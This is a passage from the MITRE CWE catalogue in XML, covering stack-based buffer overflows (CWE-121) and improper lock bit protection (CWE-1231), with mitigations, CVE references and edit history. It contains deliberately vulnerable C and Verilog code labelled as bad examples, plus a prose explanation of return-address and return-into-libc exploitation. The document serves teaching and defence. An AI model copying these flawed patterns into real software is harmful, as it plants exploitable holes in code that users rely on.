					<Modification_Comment>updated Detection_Factors</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Organization>Tortuga Logic</Contribution_Organization>
               <Contribution_Date>2021-07-16</Contribution_Date>
               <Contribution_Comment>Provided Demonstrative Example for Hardware Root of Trust</Contribution_Comment>
            </Contribution>
	    <Contribution Type="Content">
	      <Contribution_Name>Hareesh Khattri</Contribution_Name>
	      <Contribution_Organization>Intel Corporation</Contribution_Organization>
	      <Contribution_Date>2021-10-22</Contribution_Date>
	      <Contribution_Comment>provided observed example</Contribution_Comment>
	    </Contribution>
	    <Contribution Type="Content">
	      <Contribution_Name>Hareesh Khattri</Contribution_Name>
	      <Contribution_Organization>Intel Corporation</Contribution_Organization>
	      <Contribution_Date>2022-04-18</Contribution_Date>
	      <Contribution_Comment>changed detection method</Contribution_Comment>
	    </Contribution>
			<Previous_Entry_Name Date="2020-08-20">Improper Isolation of Shared Resources on System-on-Chip (SoC)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="121" Name="Stack-based Buffer Overflow" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="788" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="787" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Undetermined"/>
            <Language Name="C++" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>There are generally several security-critical data on an execution stack that can lead to arbitrary code execution. The most prominent is the stored return address, the memory address at which execution should continue once the current function is finished executing. The attacker can overwrite this value with some memory address to which the attacker also has write access, into which they place arbitrary code to be run with the full privileges of the vulnerable program. Alternately, the attacker can supply the address of an important call, for instance the POSIX system() call, leaving arguments to the call on the stack. This is often called a return into libc exploit, since the attacker generally forces the program to jump at return time into an interesting routine in the C standard library (libc). Other important data commonly on the stack include the stack pointer and frame pointer, two values that indicate offsets for computing memory addresses. Modifying those values can often be leveraged into a "write-what-where" condition.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Stack Overflow</Term>
               <Description>"Stack Overflow" is often used to mean the same thing as stack-based buffer overflow, however it is also used on occasion to mean stack exhaustion, usually a result from an excessively recursive function call. Due to the ambiguity of the term, use of stack overflow to describe either circumstance is discouraged.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
               <Note>When the consequence is arbitrary code execution, this can often be used to subvert any other security service.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-13">
             <Method>Fuzzing</Method>
             <Description>Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-10">
              <Phase>Operation</Phase> 
	      <Phase>Build and Compilation</Phase>
	      <Strategy>Environment Hardening</Strategy> 
	      <Description> 
		<xhtml:p>Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. </xhtml:p> 
		<xhtml:p> D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. </xhtml:p> 
	      </Description> 
	      <Effectiveness>Defense in Depth</Effectiveness> 
	      <Effectiveness_Notes> 
		<xhtml:p> This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. </xhtml:p> 
	      </Effectiveness_Notes> 
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Implement and perform bounds checking on input.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not use dangerous functions such as gets. Use safer, equivalent functions which check for boundary errors.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Phase>Operation</Phase>
	       <Phase>Build and Compilation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description>
		 <xhtml:p>Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. </xhtml:p> 
		 <xhtml:p> Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as "rebasing" (for Windows) and "prelinking" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. </xhtml:p> 
	       <xhtml:p> For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. </xhtml:p> </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]</Effectiveness_Notes> 
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>While buffer overflow examples can be rather complex, it is possible to have very simple, yet still exploitable, stack-based buffer overflows:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#define BUFSIZE 256<xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:1em;">char buf[BUFSIZE];<xhtml:br/>strcpy(buf, argv[1]);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The buffer size is fixed, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.</Body_Text>
               <Body_Text>Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-35395</Reference>
               <Description>Stack-based buffer overflows in SFK for wifi chipset used for IoT/embedded devices, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-35395</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Stack overflow</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP8</Entry_ID>
               <Entry_Name>Faulty Buffer Access</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR38-C</Entry_ID>
               <Entry_Name>Guarantee that library functions do not form invalid pointers</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR31-C</Entry_ID>
               <Entry_Name>Guarantee that storage for strings has sufficient space for character data and the null terminator</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
	    <Reference External_Reference_ID="REF-1029"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Stack Overruns&#34; Page 129"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 5: Buffer Overruns.&#34; Page 89"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Nonexecutable Stack&#34;, Page 76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 5, &#34;Protection Mechanisms&#34;, Page 189"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-58"/>
            <Reference External_Reference_ID="REF-60"/>
            <Reference External_Reference_ID="REF-64"/>
	    <Reference External_Reference_ID="REF-1332"/>
	    <Reference External_Reference_ID="REF-1333"/>
	    <Reference External_Reference_ID="REF-1334"/>
	    <Reference External_Reference_ID="REF-1335"/>
	    <Reference External_Reference_ID="REF-1337" Section="Memory information leaks"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Other">Stack-based buffer overflows can instantiate in return address overwrites, stack pointer overwrites or frame pointer overwrites. They can also be considered function pointer overwrites, array indexer overwrites or write-what-where condition, etc.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Common_Consequences</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1231" Name="Improper Prevention of Lock Bit Modification" Abstraction="Base" Structure="Simple" Status="Stable">
            <Description>The product uses a trusted lock bit for restricting access to registers, address regions, or other resources, but the product does not prevent the value of the lock bit from being modified after it has been set.</Description>
			<Extended_Description>
			  <xhtml:p>In integrated circuits and hardware
			  intellectual property (IP) cores, device configuration
			  controls are commonly programmed after a device power
			  reset by a trusted firmware or software module (e.g.,
			  BIOS/bootloader) and then locked from any further
			  modification.</xhtml:p>

			  <xhtml:p>This behavior is commonly implemented using a trusted lock bit. 
			  When set, the lock bit disables writes to a protected set of
			  registers or address regions. Design or coding errors in
			  the implementation of the lock bit protection feature
			  may allow the lock bit to be modified or cleared by
			  software after it has been set. Attackers might be able to unlock the system and
			  features that the bit is intended to protect.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
		 <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
		 </Weakness_Ordinalities>
            <Applicable_Platforms>
                <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
                <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
                <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
                <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
            </Applicable_Platforms>
            <Modes_Of_Introduction>
                <Introduction>
                    <Phase>Architecture and Design</Phase>
                    <Note>Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.</Note>
                </Introduction>
                <Introduction>
                    <Phase>Implementation</Phase>
                    <Note>Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.</Note>
                </Introduction>
            </Modes_Of_Introduction>
            <Common_Consequences>
                <Consequence>
                    <Scope>Access Control</Scope>
                    <Impact>Modify Memory</Impact>
                    <Likelihood>High</Likelihood>
                    <Note>Registers protected by lock bit can be modified even when lock is set.</Note>
                </Consequence>
            </Common_Consequences>
	 <Detection_Methods>
	   <Detection_Method>
	     <Method>Manual Analysis</Method>
	     <Description>Set the lock bit. Power cycle the
	     device. Attempt to clear the lock bit.  If the
	     information is changed, implement a design
	     fix. Retest. Also, attempt to indirectly clear the lock
	     bit or bypass it.</Description>
	     <Effectiveness>High</Effectiveness>
	   </Detection_Method>
	 </Detection_Methods>
            <Potential_Mitigations>
                <Mitigation>
                    <Phase>Architecture and Design</Phase>
                    <Phase>Implementation</Phase>
                    <Phase>Testing</Phase>
                    <Description>
                        <xhtml:ul>
                            <xhtml:li>Security lock bit protections must be reviewed for design inconsistency and common weaknesses.</xhtml:li>
                            <xhtml:li>Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.</xhtml:li>
                        </xhtml:ul>
                    </Description>
                    <Effectiveness>High</Effectiveness>
                </Mitigation>
            </Potential_Mitigations>
            <Demonstrative_Examples>
                <Demonstrative_Example>
                    <Intro_Text>Consider the example design below for a digital thermal sensor that detects overheating of the silicon and triggers system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by firmware, and then the register needs to be locked (TEMP_SENSOR_LOCK).</Intro_Text>
                    <Example_Code Nature="Bad" Language="Other">
                        <xhtml:table>
                            <xhtml:tr>
                                <xhtml:th>Register</xhtml:th>
                                <xhtml:th>Field description</xhtml:th>
                            </xhtml:tr>
                            <xhtml:tr>
                                <xhtml:td>CRITICAL_TEMP_LIMIT</xhtml:td>
                                <xhtml:td>[31:8] Reserved field; Read only; Default 0<xhtml:br/>[7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125</xhtml:td>
                            </xhtml:tr>
                            <xhtml:tr>
                                <xhtml:td>TEMP_SENSOR_CALIB</xhtml:td>
                                <xhtml:td>[31:0] Thermal sensor calibration data. Slope value used to map sensor reading to degrees Centigrade.</xhtml:td>
                            </xhtml:tr>
                            <xhtml:tr>
                                <xhtml:td>TEMP_SENSOR_LOCK</xhtml:td>
                                <xhtml:td>[31:1] Reserved field; Read only; Default 0<xhtml:br/>[0] Lock bit, locks CRITICAL_TEMP_LIMIT and TEMP_SENSOR_CALIB registers; Write-1-once; Default 0</xhtml:td>
                            </xhtml:tr>
                            <xhtml:tr>
                                <xhtml:td>TEMP_HW_SHUTDOWN</xhtml:td>
                                <xhtml:td>[31:2] Reserved field; Read only; Default 0<xhtml:br/>[1] Enable hardware shutdown on critical temperature detection; Read-write; Default 0</xhtml:td>
                            </xhtml:tr>
                            <xhtml:tr>
                                <xhtml:td>CURRENT_TEMP</xhtml:td>
                                <xhtml:td>[31:8] Reserved field; Read only; Default 0<xhtml:br/>[7:0] Current Temp 0-255 Centigrade; Read-only; Default 0</xhtml:td>
                            </xhtml:tr>
                        </xhtml:table>
                    </Example_Code>
                    <Body_Text>In this example, note that if the system heats to critical temperature, the response of the system is controlled by the TEMP_HW_SHUTDOWN bit [1], which is not lockable. Thus, the intended security property of the critical temperature sensor cannot be fully protected, since software can misconfigure the TEMP_HW_SHUTDOWN register even after the lock bit is set to disable the shutdown response.</Body_Text>
                    <Example_Code Nature="Good">
                        <xhtml:p>To fix this weakness, one could change the TEMP_HW_SHUTDOWN field to be locked by TEMP_SENSOR_LOCK.</xhtml:p>
                        <xhtml:table>
                            <xhtml:tr>
                                <xhtml:td>TEMP_HW_SHUTDOWN</xhtml:td>
                                <xhtml:td>[31:2] Reserved field; Read only; Default 0 <xhtml:br/>[1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0<xhtml:br/>[0] Locked by TEMP_SENSOR_LOCK</xhtml:td>
                            </xhtml:tr>
                        </xhtml:table>
                    </Example_Code>
                </Demonstrative_Example>
                <Demonstrative_Example>
                    <Intro_Text>The following example code is a snippet from the register locks inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1350]. Register locks help prevent SoC peripherals' registers from malicious use of resources. The registers that can potentially leak secret data are locked by register locks.</Intro_Text>
                    <Body_Text>In the vulnerable code, the reglk_mem is used for locking information. If one of its bits toggle to 1, the corresponding peripheral's registers will be locked. In the context of the HACK@DAC System-on-Chip (SoC), it is pertinent to note the existence of two distinct categories of reset signals.</Body_Text>
                    <Body_Text>First, there is a global reset signal denoted as "rst_ni," which possesses the capability to simultaneously reset all peripherals to their respective initial states.</Body_Text>
                    <Body_Text>Second, we have peripheral-specific reset signals, such as "rst_9," which exclusively reset individual peripherals back to their initial states. The administration of these reset signals is the responsibility of the reset controller module.</Body_Text>
                    <Example_Code Nature="Bad" Language="Verilog">
                            <xhtml:div style="margin-left:1em;">always @(posedge clk_i)<xhtml:br/>
                                <xhtml:div style="margin-left:1em;">begin<xhtml:br/>
                                    <xhtml:div style="margin-left:1em;"><xhtml:b>if(~(rst_ni &amp;&amp; ~jtag_unlock &amp;&amp; ~rst_9))</xhtml:b><xhtml:br/>
										<xhtml:div style="margin-left:1em;">begin
                                            <xhtml:div style="margin-left:1em;">for (j=0; j &lt; 6; j=j+1) begin
                                                <xhtml:div style="margin-left:1em;">reglk_mem[j] &lt;= 'h0;</xhtml:div>
                                            </xhtml:div>
                                        end</xhtml:div>
									<xhtml:br/></xhtml:div>
                                </xhtml:div>
                        	end<xhtml:br/>...</xhtml:div>
                    </Example_Code>
                    <Body_Text>In the buggy SoC architecture during HACK@DAC'21, a critical issue arises within the reset controller module. Specifically, the reset controller can inadvertently transmit a peripheral reset signal to the register lock within the user privilege domain.</Body_Text>
                    <Body_Text>This unintentional action can result in the reset of the register locks, potentially exposing private data from all other peripherals, rendering them accessible and readable.</Body_Text>
                    <Body_Text>To mitigate the issue, remove the extra reset signal rst_9 from the register lock if condition. [REF-1351]</Body_Text>
                    <Example_Code Nature="Good" Language="Verilog">
                        <xhtml:div style="margin-left:1em;">always @(posedge clk_i)<xhtml:br/>
                            <xhtml:div style="margin-left:1em;">begin<xhtml:br/>
                                <xhtml:div style="margin-left:1em;"><xhtml:b>if(~(rst_ni &amp;&amp; ~jtag_unlock))</xhtml:b><xhtml:br/>
                                    <xhtml:div style="margin-left:1em;">begin
                                        <xhtml:div style="margin-left:1em;">for (j=0; j &lt; 6; j=j+1) begin
                                            <xhtml:div style="margin-left:1em;">reglk_mem[j] &lt;= 'h0;</xhtml:div>
                                        </xhtml:div>
                                    end</xhtml:div>
                                <xhtml:br/></xhtml:div>
                            </xhtml:div>
                        end<xhtml:br/>...</xhtml:div>
                    </Example_Code>
                </Demonstrative_Example>
            </Demonstrative_Examples>
	    <Observed_Examples>
	      <Observed_Example>
		<Reference>CVE-2017-6283</Reference>
		<Description>chip reset clears critical read/write lock permissions for RSA function</Description>
		<Link>https://www.cve.org/CVERecord?id=CVE-2017-6283</Link>
	      </Observed_Example>
	    </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="680"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1350"/>
            <Reference External_Reference_ID="REF-1351"/>
        </References>
        <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>   
      
         <Content_History>
                <Submission>
                    <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
                    <Submission_Organization>Intel Corporation</Submission_Organization>
                    <Submission_Date>2020-01-15</Submission_Date>
                    <Submission_Version>4.0</Submission_Version>
                    <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
                </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
